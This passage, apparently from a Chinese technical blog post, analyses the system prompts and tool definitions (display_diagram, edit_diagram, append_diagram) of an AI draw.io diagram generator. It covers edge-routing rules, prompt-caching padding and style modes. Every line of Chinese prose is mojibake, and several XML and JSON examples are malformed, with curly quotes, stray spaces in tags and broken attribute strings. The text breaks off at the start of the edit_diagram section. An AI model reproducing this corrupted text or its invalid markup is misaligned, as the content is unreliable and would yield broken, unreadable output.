- å¯¹äºè‡ªå·¦å‘å³çš„æµå‘ï¼šä»å³ä¾§é€€å‡ºï¼ˆexitX=1ï¼‰ï¼Œä»å·¦ä¾§è¿›å…¥ï¼ˆentryX=0ï¼‰  
- å¯¹äºæ–œå‘è¿æ¥ï¼šä½¿ç”¨é è¿‘ç›®æ ‡çš„ä¸€ä¾§ï¼Œè€Œéè§’è½  
- ç¤ºä¾‹ï¼šæºèŠ‚ç‚¹å³ä¸‹æ–¹çš„èŠ‚ç‚¹ â†’ ä»åº•éƒ¨é€€å‡ºï¼ˆexitY=1ï¼‰æˆ–ä»å³ä¾§é€€å‡ºï¼ˆexitX=1ï¼‰ï¼Œè€Œéè§’è½  
  
åœ¨ç”Ÿæˆ XML ä¹‹å‰ï¼Œè¯·åœ¨è„‘æµ·ä¸­ç¡®è®¤ï¼š1. â€œæ˜¯å¦æœ‰è¾¹è·¨è¶Šäº†éå…¶èµ·ç‚¹/ç»ˆç‚¹çš„å½¢çŠ¶ï¼Ÿâ€ â†’ è‹¥æœ‰ï¼Œåˆ™æ·»åŠ è·¯å¾„ç‚¹2. â€œæ˜¯å¦æœ‰ä¸¤æ¡è¾¹å…±ç”¨åŒä¸€æ¡è·¯å¾„ï¼Ÿâ€ â†’ è‹¥æ˜¯ï¼Œåˆ™è°ƒæ•´å‡ºå…¥å£ä½ç½®3. â€œæ˜¯å¦æœ‰ä»»ä½•è¿æ¥ç‚¹ä½äºè§’è½ï¼ˆX å’Œ Y å‡ä¸º 0 æˆ– 1ï¼‰ï¼Ÿâ€ â†’ å¦‚æœæœ‰ï¼Œæ”¹ç”¨è¾¹çš„ä¸­å¿ƒç‚¹4. â€œæˆ‘èƒ½é‡æ–°æ’åˆ—å½¢çŠ¶ä»¥å‡å°‘è¾¹çº¿äº¤å‰å—ï¼Ÿâ€ â†’ å¦‚æœå¯ä»¥ï¼Œä¿®æ”¹å¸ƒå±€
</code></pre>
<h6 data-id="heading-6"><code>EXTENDED_ADDITIONS</code></h6>
<p>è¿™æ˜¯ä¸€ä»½å¯¹æ ¼å¼çº¦æŸçš„é¢å¤–çš„æç¤ºè¯ï¼Œåœ¨è¯¥é¡¹ç›®ä¸­ä»…å¯¹<code>claude-opus-4-5</code>å’Œ<code>claude-haiku-4-5</code>æ¨¡å‹ä¼šæ³¨å…¥è¯¥æ®µæç¤ºè¯ã€‚æ·»åŠ å®Œè¿™ä¸€éƒ¨åˆ†æç¤ºè¯ä¹‹åï¼Œ<code>token</code>æ¶ˆè€—ä¼šä»ä¸Šä¸€éƒ¨åˆ†çš„<del>2600æå‡åˆ°</del>4400ï¼Œæ ¹æ®é¡¹ç›®ä¸­çš„æ³¨é‡Šï¼Œè¿™ä¸€éƒ¨åˆ†åº”è¯¥æ˜¯ä¸ºäº†é€‚é…<code>Prompt Caching</code>æŠ€æœ¯ï¼Œéœ€è¦æ‰©å……<code>token</code>è¾¾åˆ°ç¼“å­˜é—¨æ§›</p>
<pre><code class="hljs language-bash" lang="bash">
<span class="hljs-comment">## æ‰©å±•å·¥å…·å‚è€ƒ</span>

<span class="hljs-comment">### æ˜¾ç¤ºå›¾è¡¨è¯¦æƒ…</span>

**éªŒè¯è§„åˆ™**ï¼ˆè¿åä»¥ä¸‹è§„åˆ™çš„ XML å°†è¢«æ‹’ç»ï¼‰ï¼š

1. ä»…ç”Ÿæˆ mxCell å…ƒç´  - åŒ…è£…æ ‡ç­¾å’Œæ ¹å•å…ƒæ ¼ä¼šè‡ªåŠ¨æ·»åŠ 

2. æ‰€æœ‰ mxCell å…ƒç´ å¿…é¡»æ˜¯åŒçº§å…ƒç´  - ä¸èƒ½åµŒå¥—åœ¨å…¶ä»– mxCell å…ƒç´ å†…

3. æ¯ä¸ª mxCell éƒ½éœ€è¦ä¸€ä¸ªå”¯ä¸€çš„ <span class="hljs-built_in">id</span> å±æ€§ï¼ˆä»â€œ2â€å¼€å§‹ï¼‰

4. æ¯ä¸ª mxCell éƒ½éœ€è¦ä¸€ä¸ªæœ‰æ•ˆçš„ parent å±æ€§ï¼ˆé¡¶çº§å…ƒç´ ä½¿ç”¨â€œ1â€ï¼Œåˆ†ç»„å…ƒç´ ä½¿ç”¨ container-idï¼‰

5. è¾¹æº/ç›®æ ‡å±æ€§å¿…é¡»å¼•ç”¨ç°æœ‰å•å…ƒæ ¼ ID

6. å€¼ä¸­çš„ç‰¹æ®Šå­—ç¬¦éœ€è¦è½¬ä¹‰ï¼š&amp;lt; è¡¨ç¤º &lt;ï¼Œ&amp;gt; è¡¨ç¤º &gt;ï¼Œ&amp;amp; è¡¨ç¤º &amp;ï¼Œ&amp;quot; è¡¨ç¤º &amp;å¯¹äºâ€œ

**æ³³é“å’Œè¾¹ç¼˜ç¤ºä¾‹**ï¼ˆä»…ç”Ÿæˆæ­¤éƒ¨åˆ† - æ— éœ€åŒ…è£…æ ‡ç­¾ï¼‰ï¼š

\`\`\`xml

&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"lane1"</span> value=<span class="hljs-string">"å‰ç«¯"</span> style=<span class="hljs-string">"swimlane;"</span> vertex=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span>&gt;

&lt;mxGeometry x=<span class="hljs-string">"40"</span> y=<span class="hljs-string">"40"</span> width=<span class="hljs-string">"200"</span> height=<span class="hljs-string">"200"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt;/mxCell&gt;

&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"step1"</span> value=<span class="hljs-string">"æ­¥éª¤ 1"</span> style=<span class="hljs-string">"rounded=1;"</span> vertex=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"lane1"</span>&gt;

&lt;mxGeometry x=<span class="hljs-string">"20"</span> y=<span class="hljs-string">"60"</span> width=<span class="hljs-string">"160"</span> height=<span class="hljs-string">"40"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt;/mxCell&gt;

&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"lane2"</span> value=<span class="hljs-string">"åç«¯"</span> style=<span class="hljs-string">"swimlane;"</span> vertex=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span>&gt;

&lt;mxGeometry x=<span class="hljs-string">"280"</span> y=<span class="hljs-string">"40"</span> width=<span class="hljs-string">"200"</span> height=<span class="hljs-string">"200"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt;/mxCell&gt;

&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"step2"</span> value=<span class="hljs-string">"æ­¥éª¤ 2"</span> style=<span class="hljs-string">"rounded=1;"</span> vertex=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"lane2"</span>&gt;

&lt;mxGeometry x=<span class="hljs-string">"20"</span> y=<span class="hljs-string">"60"</span> width=<span class="hljs-string">"160"</span> height=<span class="hljs-string">"40"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt;/mxCell&gt;

&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"edge1"</span> style=<span class="hljs-string">"edgeStyle=orthogonalEdgeStyle;endArrow=classic;"</span> edge=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span> <span class="hljs-built_in">source</span>=<span class="hljs-string">"step1"</span> target=<span class="hljs-string">"step2"</span>&gt;

&lt;mxGeometry relative=<span class="hljs-string">"1"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt;/mxCell&gt;

\`\`\`

<span class="hljs-comment">### append_diagram è¯¦æƒ…</span>

**ä½•æ—¶ä½¿ç”¨ï¼š** ä»…å½“ display_diagram è¾“å‡ºè¢«æˆªæ–­æ—¶æ‰è°ƒç”¨æ­¤å·¥å…·ï¼ˆæ‚¨ä¼šçœ‹åˆ°ä¸€æ¡é”™è¯¯æ¶ˆæ¯ï¼‰ã€‚ ï¼ˆæˆªæ–­ï¼‰ã€‚

**å…³é”®è§„åˆ™ï¼š**

1. ä¸è¦åŒ…å«ä»»ä½•åŒ…è£…æ ‡ç­¾ - åªéœ€ç»§ç»­ mxCell å…ƒç´ å³å¯

2. ä»ä¸Šæ¬¡è¾“å‡ºç»“æŸçš„ä½ç½®ç²¾ç¡®åœ°ç»§ç»­

3. å®Œæˆå‰©ä½™çš„ mxCell å…ƒç´ 

4. å¦‚æœä»ç„¶æˆªæ–­ï¼Œè¯·ä½¿ç”¨ä¸‹ä¸€ä¸ªç‰‡æ®µå†æ¬¡è°ƒç”¨ append_diagram

**ç¤ºä¾‹ï¼š** å¦‚æœä¸Šæ¬¡è¾“å‡ºä»¥ `&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"x"</span> style=<span class="hljs-string">"rounded=1"</span>` ç»“å°¾ï¼Œåˆ™ç»§ç»­ä»¥ `;<span class="hljs-string">" vertex="</span>1<span class="hljs-string">"&gt;..."</span>` ç»“å°¾å¹¶å®Œæˆå‰©ä½™çš„å…ƒç´ ã€‚

<span class="hljs-comment">### edit_diagram è¯¦ç»†ä¿¡æ¯</span>

edit_diagram ä½¿ç”¨åŸºäº ID çš„æ“ä½œï¼Œé€šè¿‡å•å…ƒæ ¼çš„ <span class="hljs-built_in">id</span> å±æ€§ç›´æ¥ä¿®æ”¹å•å…ƒæ ¼ã€‚

**æ“ä½œï¼š**

- **update**ï¼šæ›¿æ¢ç°æœ‰å•å…ƒæ ¼ã€‚æä¾› cell_id å’Œ new_xmlã€‚

- **add**ï¼šæ·»åŠ æ–°å•å…ƒæ ¼ã€‚æä¾› cell_idï¼ˆæ–°çš„å”¯ä¸€ IDï¼‰å’Œ new_xmlã€‚

- **delete**ï¼šåˆ é™¤å•å…ƒæ ¼ã€‚**çº§è”è‡ªåŠ¨æ‰§è¡Œ**ï¼šå­å…ƒç´  ANDè¾¹ï¼ˆæº/ç›®æ ‡ï¼‰ä¼šè‡ªåŠ¨åˆ é™¤ã€‚åªéœ€æŒ‡å®šä¸€ä¸ª cell_idã€‚

**è¾“å…¥æ ¼å¼ï¼š**

`json

{
<span class="hljs-string">"operations"</span>: [

{<span class="hljs-string">"operation"</span>: <span class="hljs-string">"update"</span>, <span class="hljs-string">"cell_id"</span>: <span class="hljs-string">"3"</span>, <span class="hljs-string">"new_xml"</span>: <span class="hljs-string">"&lt;mxCell ...å®Œæˆå…ƒç´ ...&gt;"</span>},

{<span class="hljs-string">"operation"</span>: <span class="hljs-string">"add"</span>, <span class="hljs-string">"cell_id"</span>: <span class="hljs-string">"new1"</span>, <span class="hljs-string">"new_xml"</span>: <span class="hljs-string">"&lt;mxCell ...æ–°å»ºå…ƒç´ ...&gt;"</span>},

{<span class="hljs-string">"operation"</span>: <span class="hljs-string">"delete"</span>, <span class="hljs-string">"cell_id"</span>: <span class="hljs-string">"5"</span>}

]

}

**ç¤ºä¾‹ï¼š**

æ›´æ”¹æ ‡ç­¾ï¼š

`json

{<span class="hljs-string">"operations"</span>: [{<span class="hljs-string">"operation"</span>: <span class="hljs-string">"update"</span>, <span class="hljs-string">"cell_id"</span>: <span class="hljs-string">"3"</span>, <span class="hljs-string">"new_xml"</span>: <span class="hljs-string">"&lt;mxCell id=\\"</span>3\\" value=\\"æ–°å»ºæ ‡ç­¾\\" style=\\"rounded=1;\\" vertex=\\"1\\" parent=\\"1\\"&gt;\\n &lt;mxGeometry x=\\"100\\" y=\\"100\\" width=\\"120\\" height=\\"60\\" as=\\"geometry\\"/&gt;\\n&lt;/mxCell&gt;<span class="hljs-string">"}]}
\`\`\`

æ·»åŠ æ–°å½¢çŠ¶ï¼š

\`\`\`json

{"</span>operations<span class="hljs-string">": [{"</span>operation<span class="hljs-string">": "</span>add<span class="hljs-string">", "</span>cell_id<span class="hljs-string">": "</span>new1<span class="hljs-string">", "</span>new_xml<span class="hljs-string">": "</span>&lt;mxCell <span class="hljs-built_in">id</span>=\\"new1\\" value=\\"æ–°ç›’å­\\" style=\\"rounded=1;fillColor=<span class="hljs-comment">#dae8fc;\\" vertex=\\"1\\" parent=\\"1\\"&gt;\\n &lt;mxGeometry x=\\"400\\" y=\\"200\\" width=\\"120\\" height=\\"60\\" as=\\"geometry\\"/&gt;\\n&lt;/mxCell&gt;"}]}</span>
\`\`\`

åˆ é™¤å®¹å™¨ï¼ˆå­å…ƒç´ å’Œè¾¹è‡ªåŠ¨åˆ é™¤ï¼‰ï¼š

\`\`\`json

{<span class="hljs-string">"operations"</span>: [{<span class="hljs-string">"operation"</span>: <span class="hljs-string">"delete"</span>, <span class="hljs-string">"cell_id"</span>: <span class="hljs-string">"2"</span>}]}

\`\`\`

**é”™è¯¯æ¢å¤ï¼š**

å¦‚æœæ‰¾ä¸åˆ° cell_idï¼Œè¯·æ£€æŸ¥â€œå½“å‰å›¾è¡¨ XMLâ€ä¸­çš„æ­£ç¡® IDã€‚å¦‚æœéœ€è¦è¿›è¡Œé‡å¤§ç»“æ„è°ƒæ•´ï¼Œè¯·ä½¿ç”¨ display_diagramã€‚

<span class="hljs-comment">## è¾¹ç¤ºä¾‹</span>

<span class="hljs-comment">### åŒä¸€èŠ‚ç‚¹ä¹‹é—´çš„ä¸¤æ¡è¾¹ï¼ˆæ­£ç¡® - æ— é‡å ï¼‰ï¼š</span>

xml
&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"e1"</span> value=<span class="hljs-string">"A åˆ° B"</span> style=<span class="hljs-string">"edgeStyle=orthogonalEdgeStyle;exitX=1;exitY=0.3;entryX=0;entryY=0.3;endArrow=classic;"</span> edge=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span> <span class="hljs-built_in">source</span>=<span class="hljs-string">"a"</span> target=<span class="hljs-string">"b"</span>&gt;

&lt;mxGeometry relative=<span class="hljs-string">"1"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt;/mxCell&gt;

&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"e2"</span> value=<span class="hljs-string">"B åˆ° A"</span> style=<span class="hljs-string">"edgeStyle=orthogonalEdgeStyle;exitX=0;exitY=0.7;entryX=1;entryY=0.7;endArrow=classic;"</span> edge=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span> <span class="hljs-built_in">source</span>=<span class="hljs-string">"b"</span> target=<span class="hljs-string">"a"</span>&gt;

&lt;mxGeometry relative=<span class="hljs-string">"1"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt;/mxCell&gt;

\`\`\`

<span class="hljs-comment">### å¸¦å•ä¸ªè·¯å¾„ç‚¹çš„è¾¹ï¼ˆç®€å•ç»•è¡Œï¼‰ï¼š</span>

\`\`\`xml

&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"edge1"</span> style=<span class="hljs-string">"edgeStyle=orthogonalEdgeStyle;exitX=0.5;exitY=1;entryX=0.5;entryY=0;endArrow=classic;"</span> edge=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span> <span class="hljs-built_in">source</span>=<span class="hljs-string">"a"</span> target=<span class="hljs-string">"b"</span>&gt;

&lt;mxGeometry relative=<span class="hljs-string">"1"</span> as=<span class="hljs-string">"geometry"</span>&gt;

&lt;Array as=<span class="hljs-string">"points"</span>&gt;

&lt;mxPoint x=<span class="hljs-string">"300"</span> y=<span class="hljs-string">"150"</span>/&gt;

&lt;/Array&gt;

&lt;/mxGeometry&gt;

&lt;/mxCell&gt;

\`\`\`

<span class="hljs-comment">### å¸¦è·¯å¾„ç‚¹çš„è¾¹ï¼ˆç»•è¿‡éšœç¢ç‰©ï¼‰ - å…³é”®æ¨¡å¼ï¼š</span>

**åœºæ™¯ï¼š** Hotfixï¼ˆå³ä¸‹ï¼‰â†’ Mainï¼ˆä¸­â€‹â€‹ä¸Šï¼‰ï¼Œä½† Developï¼ˆä¸­ä¸­ï¼‰ä½äºä¸¤è€…ä¹‹é—´ã€‚

**é”™è¯¯ï¼š** ç›´æ¥æ–œçº¿ç©¿è¿‡ Develop èŠ‚ç‚¹

**æ­£ç¡®ï¼š** ç»•å¤–åœˆèµ°ï¼ˆå…ˆå‘å³ï¼Œå†å‘ä¸Šï¼‰

\`\`\`xml

&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"hotfix_to_main"</span> style=<span class="hljs-string">"edgeStyle=orthogonalEdgeStyle;exitX=0.5;exitY=0;entryX=1;entryY=0.5;endArrow=classic;"</span> edge=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span> <span class="hljs-built_in">source</span>=<span class="hljs-string">"hotfix"</span> target=<span class="hljs-string">"main"</span>&gt;

&lt;mxGeometry relative=<span class="hljs-string">"1"</span> as=<span class="hljs-string">"geometry"</span>&gt;

&lt;Array as=<span class="hljs-string">"points"</span>&gt;

&lt;mxPoint x=<span class="hljs-string">"750"</span> y=<span class="hljs-string">"80"</span>/&gt;

&lt;mxPoint x=<span class="hljs-string">"750"</span> y=<span class="hljs-string">"150"</span>/&gt;

&lt;/Array&gt;

&lt;/mxGeometry&gt;

&lt;/mxCell&gt;

\`\`\` è¿™æ¡è·¯å¾„å°†è¾¹è·¯ç”±åˆ°æ‰€æœ‰å½¢çŠ¶çš„å³ä¾§ (x=750)ï¼Œç„¶åä»å³ä¾§è¿›å…¥ Mainã€‚

**å…³é”®åŸåˆ™ï¼š** å½“ä»¥å¯¹è§’çº¿æ–¹å¼è¿æ¥è¿œå¤„çš„èŠ‚ç‚¹æ—¶ï¼Œåº”æ²¿ç€å›¾è¡¨çš„å‘¨é•¿è·¯ç”±ï¼Œè€Œä¸æ˜¯ç©¿è¿‡å…¶ä»–å½¢çŠ¶æ‰€åœ¨çš„ä¸­å¿ƒã€‚
</code></pre>
<h6 data-id="heading-7">æ ·å¼æç¤ºè¯ï¼ˆ<code>STYLE_INSTRUCTIONS</code>å’Œ<code>MINIMAL_STYLE_INSTRUCTION</code>ï¼‰</h6>
<p>è¿™é‡Œå®šä¹‰äº†ä¸¤ç§é£æ ¼</p>
<pre><code class="hljs language-ini" lang="ini">// STYLE_INSTRUCTIONS

å¸¸ç”¨æ ·å¼ï¼š

- å½¢çŠ¶ï¼š<span class="hljs-attr">rounded</span>=<span class="hljs-number">1</span>ï¼ˆåœ†è§’ï¼‰ï¼ŒfillColor=<span class="hljs-comment">#heâ€‹â€‹xï¼ŒstrokeColor=#heâ€‹â€‹x</span>

- è¾¹ç¼˜ï¼š<span class="hljs-attr">endArrow</span>=classic/block/open/noneï¼ŒstartArrow=none/classicï¼Œcurled=<span class="hljs-number">1</span>ï¼ŒedgeStyle=orthogonalEdgeStyle

- æ–‡æœ¬ï¼š<span class="hljs-attr">fontSize</span>=<span class="hljs-number">14</span>ï¼ŒfontStyle=<span class="hljs-number">1</span>ï¼ˆç²—ä½“ï¼‰ï¼Œalign=center/left/right
</code></pre>
<pre><code class="hljs language-markdown" lang="markdown">// MINIMAL<span class="hljs-emphasis">_STYLE_</span>INSTRUCTION

<span class="hljs-section">## âš ï¸ æç®€é£æ ¼æ¨¡å¼å·²å¯ç”¨ âš ï¸</span>

<span class="hljs-section">### æ— æ ·å¼ - çº¯é»‘/ç™½</span>

<span class="hljs-bullet">-</span> æ— å¡«å……é¢œè‰²ã€æè¾¹é¢œè‰²ã€åœ†è§’ã€å­—ä½“å¤§å°ã€å­—ä½“æ ·å¼

<span class="hljs-bullet">-</span> æ— é¢œè‰²å±æ€§ï¼ˆæ— åå…­è¿›åˆ¶é¢œè‰²ï¼Œä¾‹å¦‚ #ff69b4ï¼‰

<span class="hljs-bullet">-</span> æ ·å¼ï¼šå½¢çŠ¶ä½¿ç”¨â€œwhiteSpace=wrap;html=1;â€ï¼Œè¾¹ç¼˜ä½¿ç”¨â€œhtml=1;endArrow=classic;â€

<span class="hljs-bullet">-</span> è¯·å¿½ç•¥ä»¥ä¸‹æ‰€æœ‰é¢œè‰²/æ ·å¼ç¤ºä¾‹

<span class="hljs-section">### å®¹å™¨/åˆ†ç»„å½¢çŠ¶ - å¿…é¡»é€æ˜</span>

<span class="hljs-bullet">-</span> å¯¹äºå®¹å™¨å½¢çŠ¶ï¼ˆåŒ…å«å…¶ä»–å½¢çŠ¶çš„ç›’å­ï¼‰ï¼šä½¿ç”¨â€œfillColor=none;â€ä½¿èƒŒæ™¯é€æ˜

<span class="hljs-bullet">-</span> è¿™å¯ä»¥é˜²æ­¢å®¹å™¨è¦†ç›–å­å…ƒç´ 

<span class="hljs-bullet">-</span> ä¾‹å¦‚ï¼šstyle="whiteSpace=wrap;html=1;fillColor=none;"é€‚ç”¨äºå®¹å™¨çŸ©å½¢

<span class="hljs-section">### æ³¨é‡å¸ƒå±€è´¨é‡</span>

ç”±äºæˆ‘ä»¬çœç•¥äº†æ ·å¼è®¾ç½®ï¼Œè¯·ä¸¥æ ¼éµå®ˆä»¥ä¸‹â€œè¾¹ç¼˜è·¯ç”±è§„åˆ™â€éƒ¨åˆ†ï¼š

<span class="hljs-bullet">-</span> é—´è·ï¼šæ‰€æœ‰å…ƒç´ ä¹‹é—´è‡³å°‘ä¿æŒ 50px çš„é—´è·

<span class="hljs-bullet">-</span> æ— é‡å ï¼šå…ƒç´ å’Œè¾¹ç¼˜ç»ä¸èƒ½é‡å 

<span class="hljs-bullet">-</span> ç®­å¤´å®šä½å¿…é¡»éµå¾ªå…¨éƒ¨ 7 æ¡è¾¹ç¼˜è·¯ç”±è§„åˆ™

<span class="hljs-bullet">-</span> ä½¿ç”¨è·¯å¾„ç‚¹ç»•è¿‡éšœç¢ç‰©

<span class="hljs-bullet">-</span> å¯¹äºåŒä¸€èŠ‚ç‚¹ä¹‹é—´çš„å¤šæ¡è¾¹ç¼˜ï¼Œä½¿ç”¨ä¸åŒçš„ exitY/entryY å€¼

</code></pre>
<h6 data-id="heading-8"><code>XML</code>çŠ¶æ€</h6>
<pre><code class="hljs language-typescript" lang="typescript">${previousXml
	? <span class="hljs-string">`ä¸Šä¸€ä¸ªå›¾è¡¨ XMLï¼ˆç”¨æˆ·æœ€åä¸€æ¡æ¶ˆæ¯ä¹‹å‰ï¼‰ï¼š\n"""xml\n<span class="hljs-subst">${previousXml}</span>\n"""\n\n`</span>
	: <span class="hljs-string">""</span>
}å½“å‰å›¾è¡¨ <span class="hljs-variable constant_">XML</span>ï¼ˆæƒå¨ - å”¯ä¸€æ•°æ®æºï¼‰ï¼š\n<span class="hljs-string">""</span><span class="hljs-string">"xml\n${xml || "</span><span class="hljs-string">"}\n"</span><span class="hljs-string">""</span>\n\né‡è¦æç¤ºï¼šå½“å‰å›¾è¡¨ <span class="hljs-variable constant_">XML</span> æ˜¯ç”»å¸ƒä¸Šå½“å‰å†…å®¹çš„å”¯ä¸€æ•°æ®æºã€‚ç”¨æˆ·å¯ä»¥åœ¨ draw.<span class="hljs-property">io</span> ä¸­æ‰‹åŠ¨æ·»åŠ ã€åˆ é™¤æˆ–ä¿®æ”¹å½¢çŠ¶ã€‚å§‹ç»ˆåŸºäºå½“å‰ <span class="hljs-variable constant_">XML</span> æ¥è®¡æ•°å’Œæè¿°å…ƒç´ ï¼Œè€Œä¸æ˜¯åŸºäºä¹‹å‰ç”Ÿæˆçš„ <span class="hljs-variable constant_">XML</span>ã€‚å¦‚æœåŒæ—¶æ˜¾ç¤ºäº†ä¸Šä¸€ä¸ªå’Œå½“å‰çš„ <span class="hljs-variable constant_">XML</span>ï¼Œè¯·æ¯”è¾ƒå®ƒä»¬ä»¥äº†è§£ç”¨æˆ·æ›´æ”¹äº†å“ªäº›å†…å®¹ã€‚ä½¿ç”¨ edit_diagram æ—¶ï¼Œè¯·åŠ¡å¿…ä»å½“å‰ <span class="hljs-variable constant_">XML</span> ä¸­å®Œå…¨å¤åˆ¶æœç´¢æ¨¡å¼ - å±æ€§é¡ºåºå¾ˆé‡è¦ï¼
</code></pre>
<h5 data-id="heading-9">b.<code>tool</code>å®šä¹‰ä¸æ³¨å…¥</h5>
<blockquote>
<p>ä»£ç ä½äº<code>app\api\chat\route.ts[595-760]</code></p>
</blockquote>
<p>å’Œä¸Šè¿°ç³»ç»Ÿæç¤ºè¯ä¸­æ³¨å…¥çš„ä¸€èˆ¬ï¼Œå®¢æˆ·ç«¯ä¾§æ³¨å…¥çš„èƒ½åŠ›å…±æœ‰å››ä¸ªï¼š
<code>display_diagram</code>ã€<code>edit_diagram</code>ã€<code>append_diagram</code>å’Œ<code>get_shape_library</code></p>
<h6 data-id="heading-10"><code>display_diagram</code></h6>
<pre><code class="hljs language-ini" lang="ini">åœ¨draw.ioä¸Šæ˜¾ç¤ºå›¾è¡¨ã€‚åªä¼ é€’mxCellå…ƒç´ â€”â€”åŒ…è£…å™¨æ ‡ç­¾å’Œæ ¹å•å…ƒæ˜¯è‡ªåŠ¨æ·»åŠ çš„ã€‚



éªŒè¯è§„åˆ™ï¼ˆå¦‚æœè¿åï¼ŒXMLå°†è¢«æ‹’ç»ï¼‰ï¼š

1. åªç”ŸæˆmxCellå…ƒç´ -æ²¡æœ‰åŒ…è£…æ ‡ç­¾ï¼ˆ&lt;mxfile&gt;, &lt;mxGraphModel&gt;, &lt;root&gt;ï¼‰

2. ä¸åŒ…æ‹¬æ ¹Cellsï¼ˆ<span class="hljs-attr">id</span>=<span class="hljs-string">"0â€œæˆ–id=â€1"</span>ï¼‰ -ä»–ä»¬æ˜¯è‡ªåŠ¨æ·»åŠ 

3. æ‰€æœ‰çš„mxCellå…ƒç´ å¿…é¡»æ˜¯å…„å¼Ÿå…ƒç´ â€”â€”ä¸èƒ½åµŒå¥—

4. æ¯ä¸ªmxCelléƒ½éœ€è¦ä¸€ä¸ªå”¯ä¸€çš„idï¼ˆä»â€œ2â€å¼€å§‹ï¼‰

5. æ¯ä¸ªmxCelléƒ½éœ€è¦ä¸€ä¸ªæœ‰æ•ˆçš„çˆ¶å±æ€§ï¼ˆä½¿ç”¨â€œ1â€ä½œä¸ºé¡¶å±‚ï¼‰

6. è½¬ä¹‰å€¼ä¸­çš„ç‰¹æ®Šå­—ç¬¦ï¼š&amp;ltï¼› &amp;gt<span class="hljs-comment">; &amp; &amp;quotï¼›</span>



ç¤ºä¾‹ï¼ˆåªç”Ÿæˆè¿™ä¸ª-ä¸ç”ŸæˆåŒ…è£…å™¨æ ‡ç­¾ï¼‰ï¼š

&lt;mxCell <span class="hljs-attr">id</span>=<span class="hljs-string">"lane1"</span> value=â€œFrontendâ€œ style=â€æ³³é“â€ vertex=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span>&gt;

&lt;mxGeometry <span class="hljs-attr">x</span>=<span class="hljs-string">"40"</span> y=<span class="hljs-string">"40"</span> width=<span class="hljs-string">"200"</span> height=<span class="hljs-string">"200"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt; / mxCell &gt;

&lt;mxCell <span class="hljs-attr">id</span>=<span class="hljs-string">"step1"</span> value=<span class="hljs-string">" step1"</span> style=<span class="hljs-string">"round =1 "</span> vertex=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"lane1"</span>&gt;

&lt;mxGeometry <span class="hljs-attr">x</span>=<span class="hljs-string">"20"</span> y=<span class="hljs-string">"60"</span> width=<span class="hljs-string">"160"</span> height=<span class="hljs-string">"40"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt; / mxCell &gt;

&lt;mxCell <span class="hljs-attr">id</span>=<span class="hljs-string">"lane2"</span> value=<span class="hljs-string">"Backend"</span> style=<span class="hljs-string">"swimlane "</span> vertex=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span>&gt;

&lt;mxGeometry <span class="hljs-attr">x</span>=<span class="hljs-string">"280"</span> y=<span class="hljs-string">"40"</span> width=<span class="hljs-string">"200"</span> height=<span class="hljs-string">"200"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt; / mxCell &gt;

&lt;mxCell <span class="hljs-attr">id</span>=<span class="hljs-string">"step2"</span> value=<span class="hljs-string">" step2"</span> style=<span class="hljs-string">"round =1 "</span> vertex=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"lane2"</span>&gt;

&lt;mxGeometry <span class="hljs-attr">x</span>=<span class="hljs-string">"20"</span> y=<span class="hljs-string">"60"</span> width=<span class="hljs-string">"160"</span> height=<span class="hljs-string">"40"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt; / mxCell &gt;

&lt;mxCell <span class="hljs-attr">id</span>=<span class="hljs-string">"edge1"</span> style=<span class="hljs-string">"edgeStyle= "</span> orthogonalEdgeStyle <span class="hljs-string">" endArrow=classic;"</span> edge=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span> source=<span class="hljs-string">"step1"</span> target=<span class="hljs-string">"step2"</span>&gt;

&lt;mxGeometry <span class="hljs-attr">relative</span>=<span class="hljs-string">"1"</span> as=<span class="hljs-string">"geometry"</span>/&gt;

&lt; / mxCell &gt;



æ³¨:

â€”å¯¹äºAWSå›¾è¡¨ï¼Œè¯·ä½¿ç”¨**AWS 2025å›¾æ ‡**ã€‚

-å¯¹äºåŠ¨ç”»è¿æ¥å™¨ï¼Œæ·»åŠ â€œ<span class="hljs-attr">flowAnimation</span>=<span class="hljs-number">1</span>â€è¾¹ç¼˜æ ·å¼ã€‚
</code></pre>
<h6 data-id="heading-11"><code>edit_diagram</code></h6>
<pre><code class="hljs language-bash" lang="bash">
é€šè¿‡åŸºäº<span class="hljs-built_in">id</span>çš„æ“ä½œï¼ˆæ›´æ–°/æ·»åŠ /åˆ é™¤å•å…ƒæ ¼ï¼‰ç¼–è¾‘å½“å‰å…³ç³»å›¾ã€‚

æ“ä½œ:
